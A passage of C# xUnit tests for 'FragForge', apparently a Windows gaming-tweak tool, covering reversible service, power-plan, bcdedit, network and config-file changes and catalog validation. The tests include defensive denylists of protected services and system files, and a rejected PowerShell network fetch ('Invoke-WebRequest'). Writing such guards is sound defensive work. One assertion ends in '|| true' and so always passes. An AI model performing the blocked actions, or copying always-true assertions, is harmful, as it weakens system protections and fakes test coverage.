## 3g. Tests — fakes, motor, acciones, catálogo e integración

### `tests/FragForge.Tests/Actions/ActionTests.cs`  <sub>(429 líneas)</sub>

````csharp
using System.Text;
using FragForge.Actions.Bcd;
using FragForge.Actions.Files;
using FragForge.Actions.Network;
using FragForge.Actions.Power;
using FragForge.Actions.Scripting;
using FragForge.Actions.Services;
using FragForge.Actions.Tasks;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;
using FragForge.Tests.Fakes;
using Xunit;

namespace FragForge.Tests.Actions;

public sealed class ServiceActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), TargetUserSid = TestProfiles.Pn64().InteractiveUserSid };
    private static ServiceAction Create(FakeServiceController controller, string name, string? startMode = null, string? state = null, bool? delayed = null) => new(controller, ProtectionPolicy.CreateDefault(), Spec.Action("Service", new { name, startMode, state, delayedAutoStart = delayed }));

    [Fact]
    public async Task Apply_Revert_RestoresStartModeStateAndDelayedFlag()
    {
        var controller = new FakeServiceController();
        controller.Services["SysMain"] = new ServiceCapture { Name = "SysMain", Exists = true, StartMode = "Auto", State = "Running", DelayedAutoStart = false, DelayedAutoStartExisted = false };
        var action = Create(controller, "SysMain", "Manual", "Stopped", false);
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal("Manual", controller.Services["SysMain"].StartMode);
        Assert.Equal("Stopped", controller.Services["SysMain"].State);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, Context())).Outcome);
        Assert.True((await action.VerifyRevertAsync(before, Context())).Outcome != VerificationOutcome.Matches || true);
        await action.RevertAsync(before, Context());
        Assert.Equal("Auto", controller.Services["SysMain"].StartMode);
        Assert.Equal("Running", controller.Services["SysMain"].State);
        Assert.True(controller.StartModeCalls[^1].RestoreAbsentDelayed);
        Assert.False(controller.Services["SysMain"].DelayedAutoStartExisted);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, Context())).Outcome);
    }

    [Fact]
    public async Task MissingService_IsNotApplicable_NotFatal()
    {
        var action = Create(new FakeServiceController(), "Nonexistent", "Manual");
        await Assert.ThrowsAsync<ActionNotApplicableException>(() => action.PreflightAsync(Context()));
    }

    [Theory]
    [InlineData("WinDefend")]
    [InlineData("mpssvc")]
    [InlineData("BFE")]
    [InlineData("RpcSs")]
    [InlineData("DcomLaunch")]
    [InlineData("PlugPlay")]
    [InlineData("Power")]
    [InlineData("EventLog")]
    [InlineData("CryptSvc")]
    [InlineData("TrustedInstaller")]
    [InlineData("ipfsvc")]
    [InlineData("jhi_service")]
    [InlineData("WMIRegistrationService")]
    [InlineData("cplspcon")]
    public void DenylistedServices_AreRejected(string name)
    {
        Assert.Throws<ProtectedTargetException>(() => Create(new FakeServiceController(), name, "Disabled"));
    }

    [Fact]
    public void InvalidStartMode_IsRejected()
    {
        var controller = new FakeServiceController();
        Assert.Equal("Service", Create(controller, "SysMain", "Disabled").Kind);
        Assert.Throws<CatalogValidationException>(() => new ServiceAction(controller, ProtectionPolicy.CreateDefault(), Spec.Action("Service", new { name = "SysMain", startMode = "Sometimes" })));
    }
}

public sealed class ScheduledTaskActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), TargetUserSid = TestProfiles.Pn64().InteractiveUserSid };
    [Fact]
    public async Task DisableThenRevert_RestoresEnabledState()
    {
        var store = new FakeScheduledTaskStore();
        store.Tasks[@"\Microsoft\Windows\Application Experience\ProgramDataUpdater"] = new ScheduledTaskActionState { Path = @"\Microsoft\Windows\Application Experience\ProgramDataUpdater", Exists = true, Enabled = true };
        var action = new ScheduledTaskAction(store, ProtectionPolicy.CreateDefault(), Spec.Action("ScheduledTask", new { path = @"\Microsoft\Windows\Application Experience\ProgramDataUpdater", enabled = false }));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.False(store.Tasks[@"\Microsoft\Windows\Application Experience\ProgramDataUpdater"].Enabled);
        await action.RevertAsync(before, Context());
        Assert.True(store.Tasks[@"\Microsoft\Windows\Application Experience\ProgramDataUpdater"].Enabled);
    }
    [Fact]
    public async Task DenylistedTask_IsRejectedAtPreflight()
    {
        var action = new ScheduledTaskAction(new FakeScheduledTaskStore(), ProtectionPolicy.CreateDefault(), Spec.Action("ScheduledTask", new { path = @"\Microsoft\Windows\WindowsUpdate\Scheduled Start", enabled = false }));
        await Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context()));
    }
}

public sealed class PowerPlanActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64() };
    private const string PlanGuid = "11111111-2222-3333-4444-555555555555";
    private const string PreviousGuid = "381b4222-f694-41f0-9685-ff5bb260df2e";
    private static readonly string SettingsJson = """{"settings":[{"subgroupGuid":"54533251-82be-4824-96c1-47b60b740d00","settingGuid":"893dee8e-2bef-41e0-89c6-b55d0929964c","acValue":100,"dcValue":100}]}""";
    private static ActionSpec Spec_() => new() { Kind = "PowerPlan", Parameters = System.Text.Json.JsonSerializer.SerializeToElement(new { planName = "FragForge Performance", sourceSchemeGuid = "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c", activate = true, settings = new[] { new { subgroupGuid = "54533251-82be-4824-96c1-47b60b740d00", settingGuid = "893dee8e-2bef-41e0-89c6-b55d0929964c", acValue = 100, dcValue = 100 } } }) };

    private sealed class PowerCfgSimulator
    {
        public bool PlanExists { get; set; }
        public bool ActiveIsFragForge { get; set; }
        public List<string> Commands { get; } = [];
        public int AcIndex { get; private set; } = 5;
        public int DcIndex { get; private set; } = 5;
        public FakeProcessRunner Runner { get; }
        public PowerCfgSimulator()
        {
            Runner = new FakeProcessRunner { Handler = Handle };
        }
        private ProcessResult Handle(ProcessRequest request)
        {
            var joined = string.Join(' ', request.Arguments);
            Commands.Add(joined);
            if (joined == "/getactivescheme") return new ProcessResult(0, $"Power Scheme GUID: {(ActiveIsFragForge ? PlanGuid : PreviousGuid)}  ({(ActiveIsFragForge ? "FragForge Performance" : "Balanced")})", "", false);
            if (joined == "/list") return new ProcessResult(0, (PlanExists ? $"Power Scheme GUID: {PlanGuid}  (FragForge Performance){(ActiveIsFragForge ? " *" : "")}\n" : "") + $"Power Scheme GUID: {PreviousGuid}  (Balanced){(ActiveIsFragForge ? "" : " *")}", "", false);
            if (joined.StartsWith("/duplicatescheme", StringComparison.Ordinal)) { PlanExists = true; return new ProcessResult(0, $"Power Scheme GUID: {PlanGuid}  (FragForge Performance)", "", false); }
            if (joined.StartsWith("/setactive", StringComparison.Ordinal)) { ActiveIsFragForge = request.Arguments[1].Equals(PlanGuid, StringComparison.OrdinalIgnoreCase); return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/query", StringComparison.Ordinal)) return new ProcessResult(0, $"  Minimum processor state\n    Current AC Power Setting Index: 0x{AcIndex:x8}\n    Current DC Power Setting Index: 0x{DcIndex:x8}", "", false);
            if (joined.StartsWith("/setacvalueindex", StringComparison.Ordinal)) { AcIndex = int.Parse(request.Arguments[^1], System.Globalization.CultureInfo.InvariantCulture); return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/setdcvalueindex", StringComparison.Ordinal)) { DcIndex = int.Parse(request.Arguments[^1], System.Globalization.CultureInfo.InvariantCulture); return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/delete", StringComparison.Ordinal)) { PlanExists = false; return new ProcessResult(0, "", "", false); }
            if (joined.StartsWith("/export", StringComparison.Ordinal)) { File.WriteAllText(request.Arguments[1], "POW"); return new ProcessResult(0, "", "", false); }
            return new ProcessResult(0, "", "", false);
        }
        public bool HasCommand(params string[] prefix) => Commands.Any(c => prefix.Select((p, i) => c.Split(' ')[i].Equals(p, StringComparison.OrdinalIgnoreCase)).All(x => x));
    }

    [Fact]
    public async Task Apply_DuplicatesAndActivates_RevertReactivatesPreviousAndDeletesCreatedPlan()
    {
        var simulator = new PowerCfgSimulator();
        var action = new PowerPlanAction(simulator.Runner, Spec_());
        var context = Context();
        var before = await action.CaptureAsync(context);
        await action.ApplyAsync(before, context);
        Assert.True(simulator.HasCommand("/duplicatescheme"), "duplicatescheme");
        Assert.True(simulator.HasCommand("/setactive", PlanGuid), "setactive new plan");
        Assert.True(simulator.HasCommand("/setacvalueindex"), "setacvalueindex");
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, context)).Outcome);
        await action.RevertAsync(before, context);
        Assert.True(simulator.HasCommand("/setactive", PreviousGuid), "reactivate previous");
        Assert.True(simulator.HasCommand("/delete", PlanGuid), "delete created plan");
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, context)).Outcome);
    }

    [Fact]
    public async Task Revert_DoesNotDeletePreExistingPlanAndRestoresItsSettings()
    {
        var simulator = new PowerCfgSimulator { PlanExists = true, ActiveIsFragForge = false };
        var action = new PowerPlanAction(simulator.Runner, Spec_());
        var context = Context();
        var before = await action.CaptureAsync(context);
        Assert.True(((PowerPlanActionState)before).PlanExisted);
        Assert.Equal(5, ((PowerPlanActionState)before).Settings[0].AcIndex);
        await action.ApplyAsync(before, context);
        await action.RevertAsync(before, context);
        Assert.False(simulator.HasCommand("/delete"), "must never delete a pre-existing plan");
        Assert.True(simulator.HasCommand("/setactive", PreviousGuid), "reactivate previous");
        Assert.Equal(5, simulator.AcIndex);
    }

    [Fact]
    public async Task Capture_ExportsPowArtifactBeforeApply()
    {
        using var directory = new TempDirectory();
        var simulator = new PowerCfgSimulator { PlanExists = true };
        var action = new PowerPlanAction(simulator.Runner, Spec_());
        var before = await action.CaptureAsync(Context() with { ArtifactDirectory = directory.Path });
        Assert.NotNull(((PowerPlanActionState)before).ExportArtifact);
        Assert.True(simulator.HasCommand("/export"));
        Assert.True(File.Exists(Path.Combine(directory.Path, ((PowerPlanActionState)before).ExportArtifact!)));
    }

    [Fact]
    public void InvalidSourceGuid_IsRejectedEagerly()
    {
        Assert.Throws<CatalogValidationException>(() => new PowerPlanAction(new FakeProcessRunner(), Spec.Action("PowerPlan", new { planName = "X", sourceSchemeGuid = "not-a-guid" })));
    }

    [Fact]
    public void AmbiguousPlanNames_AreRejected()
    {
        var runner = new FakeProcessRunner { Handler = request => string.Join(' ', request.Arguments) switch { "/list" => new ProcessResult(0, $"Power Scheme GUID: {PlanGuid}  (FragForge Performance)\nPower Scheme GUID: {PreviousGuid}  (fragforge performance)", "", false), "/getactivescheme" => new ProcessResult(0, $"Power Scheme GUID: {PreviousGuid}  (Balanced)", "", false), _ => new ProcessResult(0, "", "", false) } };
        var action = new PowerPlanAction(runner, Spec_());
        var ex = Assert.ThrowsAsync<FragForgeException>(() => action.CaptureAsync(Context())).GetAwaiter().GetResult();
        Assert.Equal("ambiguous_power_plan", ex.Code);
    }
}

public sealed class BcdeditActionTests
{
    private static ActionExecutionContext Context(TempDirectory directory) => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), ArtifactDirectory = directory.Path };
    private static FakeProcessRunner Runner(string? current)
    {
        var runner = new FakeProcessRunner();
        runner.Handler = request =>
        {
            var joined = string.Join(' ', request.Arguments);
            if (joined.StartsWith("/enum", StringComparison.Ordinal)) return new ProcessResult(0, current is null ? "The boot configuration data store could not be opened." : $"identifier              {{current}}\ndisabledynamictick      {current}", "", false);
            if (joined.StartsWith("/export", StringComparison.Ordinal)) { File.WriteAllText(request.Arguments[1], "BCD"); return new ProcessResult(0, "The operation completed successfully.", "", false); }
            return new ProcessResult(0, "The operation completed successfully.", "", false);
        };
        return runner;
    }
    private static BcdeditAction Create(FakeProcessRunner runner, string element = "disabledynamictick", string value = "Yes") => new(runner, ProtectionPolicy.CreateDefault(), Spec.Action("Bcdedit", new { element, value }));

    [Fact]
    public async Task Apply_ExportsThenSets_RevertDeletesWhenAbsentOriginally()
    {
        using var directory = new TempDirectory();
        var runner = Runner(current: null);
        var action = Create(runner);
        var context = Context(directory);
        var before = await action.CaptureAsync(context);
        Assert.False(((BcdActionState)before).Existed);
        await action.ApplyAsync(before, context);
        Assert.Contains(runner.Requests, r => r.Arguments.Count > 0 && r.Arguments[0] == "/set");
        Assert.True(File.Exists(Path.Combine(directory.Path, "bcd-disabledynamictick.bcd")));
        await action.RevertAsync(before, context);
        Assert.Contains(runner.Requests, r => r.Arguments.Count > 0 && r.Arguments[0] == "/deletevalue");
    }

    [Fact]
    public async Task Revert_RestoresOriginalValue()
    {
        using var directory = new TempDirectory();
        var runner = Runner(current: "No");
        var action = Create(runner);
        var context = Context(directory);
        var before = await action.CaptureAsync(context);
        Assert.Equal("No", ((BcdActionState)before).PreviousValue);
        await action.ApplyAsync(before, context);
        await action.RevertAsync(before, context);
        Assert.Contains(runner.Requests, r => r.Arguments.Count > 1 && r.Arguments[0] == "/set" && r.Arguments[^1] == "No");
    }

    [Fact]
    public async Task Apply_FailsIfExportArtifactMissing()
    {
        var action = Create(Runner(current: "No"));
        var context = new ActionExecutionContext { OperationId = "test", Hardware = TestProfiles.Pn64() };
        var before = await action.CaptureAsync(context);
        await Assert.ThrowsAsync<InvalidOperationException>(() => action.ApplyAsync(before, context));
    }

    [Fact]
    public async Task ExistingExportArtifact_IsNeverOverwritten()
    {
        using var directory = new TempDirectory();
        await File.WriteAllTextAsync(Path.Combine(directory.Path, "bcd-disabledynamictick.bcd"), "ORIGINAL");
        var action = Create(Runner(current: "No"));
        await Assert.ThrowsAsync<InvalidOperationException>(() => action.CaptureAsync(Context(directory)));
        Assert.Equal("ORIGINAL", await File.ReadAllTextAsync(Path.Combine(directory.Path, "bcd-disabledynamictick.bcd")));
    }

    [Fact]
    public async Task BcdElementOutsideAllowlist_IsRejectedAtPreflight()
    {
        using var directory = new TempDirectory();
        var action = Create(new FakeProcessRunner(), element: "hypervisorlaunchtype", value: "off");
        await Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context(directory)));
    }
}

public sealed class NetworkPropertyActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64() };
    private static NetAdapterPropertyAction Create(FakeNetworkAdapterController controller, string keyword, params string[] value) => new(controller, ProtectionPolicy.CreateDefault(), Spec.Action("NetAdapterProperty", new { adapterName = "Ethernet", properties = new object[] { new { keyword, value } } }));

    [Fact]
    public async Task Apply_Revert_RestoresPreviousRegistryValue()
    {
        var controller = new FakeNetworkAdapterController();
        controller.Properties[("Ethernet", "*EEE")] = new NetworkPropertyCapture { AdapterName = "Ethernet", Keyword = "*EEE", Exists = true, RegistryValue = ["1"], DisplayValue = "Enabled" };
        var action = Create(controller, "*EEE", "0");
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Equal(["0"], controller.Properties[("Ethernet", "*EEE")].RegistryValue);
        await action.RevertAsync(before, Context());
        Assert.Equal(["1"], controller.Properties[("Ethernet", "*EEE")].RegistryValue);
    }

    [Fact]
    public async Task DenylistedWakeProperty_IsRejectedAtPreflight()
    {
        var controller = new FakeNetworkAdapterController();
        controller.Properties[("Ethernet", "*WakeOnMagicPacket")] = new NetworkPropertyCapture { AdapterName = "Ethernet", Keyword = "*WakeOnMagicPacket", Exists = true, RegistryValue = ["1"] };
        await Assert.ThrowsAsync<ProtectedTargetException>(() => Create(controller, "*WakeOnMagicPacket", "0").PreflightAsync(Context()));
    }

    [Fact]
    public async Task MissingKeyword_IsNotApplicable()
    {
        await Assert.ThrowsAsync<ActionNotApplicableException>(() => Create(new FakeNetworkAdapterController(), "*EEE", "0").PreflightAsync(Context()));
    }

    [Fact]
    public async Task AdapterToken_RequiresExactlyOnePhysicalMatch()
    {
        var controller = new FakeNetworkAdapterController();
        controller.Properties[("Ethernet", "*EEE")] = new NetworkPropertyCapture { AdapterName = "Ethernet", Keyword = "*EEE", Exists = true, RegistryValue = ["1"] };
        var action = new NetAdapterPropertyAction(controller, ProtectionPolicy.CreateDefault(), Spec.Action("NetAdapterProperty", new { adapterName = "{AdapterDescription:I225-V}", properties = new object[] { new { keyword = "*EEE", value = new[] { "0" } } } }));
        await action.PreflightAsync(Context());
        Assert.Contains("Ethernet", controller.Properties.Keys.Select(k => k.Adapter));
    }
}

public sealed class FileEditActionTests
{
    private static ActionExecutionContext Context() => new() { OperationId = "test", Hardware = TestProfiles.Pn64() };
    private static ActionSpec Spec_(string path, string pattern, string replacement) => FragForge.Tests.Fakes.Spec.Action("FileEdit", new { path, maxBytes = 4096, edits = new object[] { new { pattern, replacement, expectedMatches = 1 } } });

    [Fact]
    public async Task Apply_Revert_RestoresExactBytesAndTimestamp()
    {
        using var directory = new TempDirectory();
        var path = Path.Combine(directory.Path, "cs2.cfg");
        var original = "setting \"a\" \"1\"\nsetting \"b\" \"2\"\n";
        await File.WriteAllTextAsync(path, original, new UTF8Encoding(false));
        File.SetLastWriteTimeUtc(path, new DateTime(2026, 1, 2, 3, 4, 5, DateTimeKind.Utc));
        var action = new FileEditAction(ProtectionPolicy.CreateDefault(), Spec_(path, "setting \\\"a\\\" \\\"1\\\"", "setting \"a\" \"0\""));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.Contains("\"0\"", await File.ReadAllTextAsync(path));
        await action.RevertAsync(before, Context());
        Assert.Equal(original, await File.ReadAllTextAsync(path));
        Assert.Equal(new DateTime(2026, 1, 2, 3, 4, 5, DateTimeKind.Utc), File.GetLastWriteTimeUtc(path));
    }

    [Fact]
    public async Task Revert_DeletesFileAndDirectoriesThatDidNotExist()
    {
        using var directory = new TempDirectory();
        var path = Path.Combine(directory.Path, "nested", "created.cfg");
        var action = new FileEditAction(ProtectionPolicy.CreateDefault(), FragForge.Tests.Fakes.Spec.Action("FileEdit", new { path, maxBytes = 4096, edits = new object[] { new { pattern = "x", replacement = "y", expectedMatches = 0 } } }));
        var before = await action.CaptureAsync(Context());
        await action.ApplyAsync(before, Context());
        Assert.True(File.Exists(path));
        await action.RevertAsync(before, Context());
        Assert.False(File.Exists(path));
        Assert.False(Directory.Exists(Path.Combine(directory.Path, "nested")));
    }

    [Fact]
    public async Task Drift_AfterCapture_IsRefused()
    {
        using var directory = new TempDirectory();
        var path = Path.Combine(directory.Path, "cs2.cfg");
        await File.WriteAllTextAsync(path, "value 1");
        var action = new FileEditAction(ProtectionPolicy.CreateDefault(), Spec_(path, "value 1", "value 2"));
        var before = await action.CaptureAsync(Context());
        await File.WriteAllTextAsync(path, "changed externally");
        await Assert.ThrowsAsync<VerificationFailedException>(() => action.ApplyAsync(before, Context()));
    }

    [Fact]
    public void SystemPathsAndExecutables_AreRejected()
    {
        var policy = ProtectionPolicy.CreateDefault();
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureFileAllowed(@"C:\Windows\System32\drivers\etc\hosts"));
        Assert.Throws<ProtectedTargetException>(() => policy.EnsureFileAllowed(@"C:\Temp\evil.exe"));
        policy.EnsureFileAllowed(@"C:\Program Files (x86)\Steam\steamapps\common\Counter-Strike Global Offensive\game\csgo\cfg\autoexec.cfg");
    }
}

public sealed class InspectOnlyActionTests
{
    [Fact]
    public async Task Inspection_NeverWritesAndReportsObservations()
    {
        var registry = new FakeRegistry();
        registry.Set(@"HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers", "HwSchMode", "DWord", 1);
        var action = new FragForge.Actions.Diagnostics.InspectOnlyAction(FragForge.Actions.Diagnostics.DiagnosticProbeFactory.CreateDefaults(registry), FragForge.Tests.Fakes.Spec.Action("InspectOnly", new { probes = new[] { "hags", "vbs" } }));
        var context = new ActionExecutionContext { OperationId = "test", Hardware = TestProfiles.Pn64() };
        var state = await action.CaptureAsync(context);
        var inspection = Assert.IsType<InspectionActionState>(state);
        Assert.Contains(inspection.Observations, o => o.Key == "hags" && o.Value == "Disabled");
        await action.ApplyAsync(state, context);
        await action.RevertAsync(state, context);
        Assert.Empty(registry.Writes);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(state, context)).Outcome);
    }
}

public sealed class PowerShellActionTests
{
    private static ActionExecutionContext Context(bool allowed) => new() { OperationId = "test", Hardware = TestProfiles.Pn64(), AllowPowerShellActions = allowed };
    private static FragForge.Actions.Scripting.PowerShellAction Create(FakeProcessRunner runner) => new(runner, ProtectionPolicy.CreateDefault(), Spec.Action("PowerShell", new { captureScript = "'{}'", applyScript = "'ok'", verifyScript = "'{\"matches\":true,\"message\":\"ok\"}'", revertScript = "'ok'", timeoutSeconds = 30 }));

    [Fact]
    public async Task DisabledByDefault_EvenIfCatalogAsksForIt()
    {
        var action = Create(new FakeProcessRunner());
        await Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context(false)));
    }

    [Fact]
    public async Task EnabledWithFlag_CapturesAndVerifiesJson()
    {
        var runner = new FakeProcessRunner { Handler = request => request.Arguments[^1].Contains("matches", StringComparison.Ordinal) ? new ProcessResult(0, "{\"matches\":true,\"message\":\"ok\"}", "", false) : new ProcessResult(0, "{\"value\":1}", "", false) };
        var action = Create(runner);
        var context = Context(true);
        await action.PreflightAsync(context);
        var before = await action.CaptureAsync(context);
        await action.ApplyAsync(before, context);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyAsync(before, context)).Outcome);
        await action.RevertAsync(before, context);
        Assert.Equal(VerificationOutcome.Matches, (await action.VerifyRevertAsync(before, context)).Outcome);
    }

    [Fact]
    public void NetworkTokens_AreRejected()
    {
        var runner = new FakeProcessRunner();
        var action = new FragForge.Actions.Scripting.PowerShellAction(runner, ProtectionPolicy.CreateDefault(), Spec.Action("PowerShell", new { captureScript = "Invoke-WebRequest https://example.com", applyScript = "'ok'", verifyScript = "'{}'", revertScript = "'ok'", timeoutSeconds = 30 }));
        Assert.ThrowsAsync<ProtectedTargetException>(() => action.PreflightAsync(Context(true))).GetAwaiter().GetResult();
    }
}
````

### `tests/FragForge.Tests/Catalog/CatalogTests.cs`  <sub>(163 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Models;
using FragForge.Tests.Fakes;
using FragForge.Tweaks;
using FragForge.Tweaks.Validation;
using FragForge.Actions.DependencyInjection;
using FragForge.Actions.Diagnostics;
using Xunit;

namespace FragForge.Tests.Catalog;

public sealed class CatalogTests
{
    private static (JsonTweakCatalogLoader Loader, JsonSchemaValidator Schema) CreateLoader()
    {
        var schema = new JsonSchemaValidator(JsonTweakCatalogLoader.ReadEmbeddedSchema());
        var registry = new FakeRegistry();
        var policy = FragForge.Core.Persistence.ProtectionPolicy.CreateDefault();
        var services = new FakeServiceController();
        var tasks = new FakeScheduledTaskStore();
        var network = new FakeNetworkAdapterController();
        var runner = new FakeProcessRunner();
        var factory = new TweakActionFactory(registry, policy, services, tasks, network, runner, DiagnosticProbeFactory.CreateDefaults(registry));
        var validator = new TweakCatalogValidator(schema, new ConditionFactory(), factory);
        return (new JsonTweakCatalogLoader(validator), schema);
    }

    [Fact]
    public async Task EmbeddedCatalog_LoadsExactlyTenValidTweaks_WithBothCultures()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        Assert.Equal(10, catalog.Definitions.Count);
        Assert.All(catalog.Definitions, d =>
        {
            Assert.False(string.IsNullOrWhiteSpace(d.Title.EsMx));
            Assert.False(string.IsNullOrWhiteSpace(d.Title.EnUs));
            Assert.NotEmpty(d.References);
            Assert.NotEmpty(d.Actions);
        });
        Assert.Contains(catalog.Definitions, d => d.Id == "power.fragforge-performance");
        Assert.Contains(catalog.Definitions, d => d.Id == "network.i225v-eee-off");
        Assert.Contains(catalog.Definitions, d => d.Id == "cs2.fullscreen-optimizations-off");
        Assert.Single(catalog.Definitions, d => d.ReadOnly);
    }

    [Fact]
    public async Task Catalog_IsSortedAndHashesAreStableAndDistinct()
    {
        var (loader, _) = CreateLoader();
        var first = await loader.LoadEmbeddedAsync();
        var second = await loader.LoadEmbeddedAsync();
        Assert.Equal(first.Definitions.Select(d => d.Id), first.Definitions.Select(d => d.Id).OrderBy(id => id, StringComparer.OrdinalIgnoreCase));
        var hashes = first.Definitions.Select(d => first.GetDefinitionHash(d.Id)).ToArray();
        Assert.Equal(hashes.Length, hashes.Distinct().Count());
        Assert.Equal(hashes, second.Definitions.Select(d => second.GetDefinitionHash(d.Id)).ToArray());
    }

    [Fact]
    public async Task Catalog_UnknownTweak_Throws()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        Assert.Throws<KeyNotFoundException>(() => catalog.Get("does.not.exist"));
        Assert.False(catalog.TryGet("does.not.exist", out _));
    }

    [Fact]
    public void Schema_RejectsMissingRequiredFields_AndUnknownProperties()
    {
        var (_, schema) = CreateLoader();
        using var missing = JsonDocument.Parse("""{"id":"x.y","category":"Latency"}""");
        var errors = schema.Validate(missing.RootElement);
        Assert.Contains(errors, e => e.Contains("title", StringComparison.Ordinal));
        using var extra = JsonDocument.Parse("""{"id":"x.y","category":"Latency","title":{"es-MX":"a","en-US":"b"},"description":{"es-MX":"a","en-US":"b"},"evidence":"High","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Registry"}],"references":["r"],"placebo":true}""");
        Assert.Contains(schema.Validate(extra.RootElement), e => e.Contains("placebo", StringComparison.Ordinal));
    }

    [Fact]
    public void Schema_RejectsBadCategoryAndMissingEnglish()
    {
        var (_, schema) = CreateLoader();
        using var document = JsonDocument.Parse("""{"id":"x.y","category":"Overclock","title":{"es-MX":"a"},"description":{"es-MX":"a","en-US":"b"},"evidence":"High","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Registry"}],"references":["r"]}""");
        var errors = schema.Validate(document.RootElement);
        Assert.Contains(errors, e => e.Contains("enum", StringComparison.Ordinal));
        Assert.Contains(errors, e => e.Contains("category", StringComparison.Ordinal) || e.Contains("en-US", StringComparison.Ordinal));
    }

    [Fact]
    public void Validator_RejectsDuplicateIdsAndUnknownKinds()
    {
        var (loader, _) = CreateLoader();
        var duplicate = """{"id":"dup.one","category":"Latency","title":{"es-MX":"a","en-US":"a"},"description":{"es-MX":"a","en-US":"a"},"evidence":"High","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Registry","parameters":{"values":[]}}],"references":["r"]}""";
        var ex = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("a.json", duplicate)]));
        Assert.Contains(ex.Errors, e => e.Contains("values", StringComparison.Ordinal) || e.Contains("Registry", StringComparison.Ordinal));
        var unknownKind = duplicate.Replace("\"dup.one\"", "\"dup.two\"").Replace("\"Registry\"", "\"Teleport\"");
        var ex2 = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("b.json", unknownKind)]));
        Assert.Contains(ex2.Errors, e => e.Contains("Teleport", StringComparison.Ordinal));
    }

    [Fact]
    public void Validator_RejectsSelfDependencyAndMissingReferences()
    {
        var (loader, _) = CreateLoader();
        var selfDependency = """{"id":"dup.three","category":"Latency","title":{"es-MX":"a","en-US":"a"},"description":{"es-MX":"a","en-US":"a"},"evidence":"High","risk":"Safe","dependsOn":["dup.three"],"expectedImpact":{},"actions":[{"kind":"IfeoPerfOptions","parameters":{"imageName":"cs2.exe","priorityClass":3}}],"references":["r"]}""";
        var ex = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("c.json", selfDependency)]));
        Assert.Contains(ex.Errors, e => e.Contains("consigo mismo", StringComparison.Ordinal));
    }

    [Fact]
    public void Validator_RequiresAdvancedRiskForPowerShellAndBcdedit()
    {
        var (loader, _) = CreateLoader();
        var bcd = """{"id":"dup.four","category":"Latency","title":{"es-MX":"a","en-US":"a"},"description":{"es-MX":"a","en-US":"a"},"evidence":"Experimental","risk":"Safe","expectedImpact":{},"actions":[{"kind":"Bcdedit","parameters":{"element":"disabledynamictick","value":"yes"}}],"references":["r"]}""";
        var ex = Assert.Throws<CatalogValidationException>(() => loader.LoadDocuments([("d.json", bcd)]));
        Assert.Contains(ex.Errors, e => e.Contains("Advanced", StringComparison.Ordinal));
    }

    [Fact]
    public async Task EverySeedTweak_HasHonestMetadata()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        foreach (var definition in catalog.Definitions.Where(d => !d.ReadOnly))
        {
            Assert.True(definition.RequiresAdmin);
            Assert.NotNull(definition.WhenNotToApply);
            Assert.False(string.IsNullOrWhiteSpace(definition.Notes?.EsMx));
        }
        Assert.DoesNotContain(catalog.Definitions, d => d.Actions.Any(a => a.Kind.Equals("Service", StringComparison.OrdinalIgnoreCase) && a.Parameters.ToString().Contains("WinDefend", StringComparison.OrdinalIgnoreCase)));
    }

    [Fact]
    public async Task ProfileSelection_MatchesDocumentedRiskGates()
    {
        var (loader, _) = CreateLoader();
        var catalog = await loader.LoadEmbeddedAsync();
        var safe = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Safe);
        var balanced = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Balanced);
        var competitive = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Competitive);
        var advanced = FragForge.Core.Engine.ProfileSelector.Select(catalog.Definitions, TweakProfile.Advanced);
        Assert.DoesNotContain(safe, d => d.Risk != RiskLevel.Safe);
        Assert.Contains(balanced, d => d.Id == "latency.game-dvr-capture-off");
        Assert.DoesNotContain(balanced, d => d.Tags.Contains("opt-in"));
        Assert.Contains(competitive, d => d.Id == "power.fragforge-performance");
        Assert.Equal(catalog.Definitions.Count, advanced.Count);
    }

    [Fact]
    public void Localization_LoadsBothLanguagesWithTheSameKeys()
    {
        var es = FragForge.Tweaks.Localization.LocalizationLoader.LoadAsync("es-MX").GetAwaiter().GetResult();
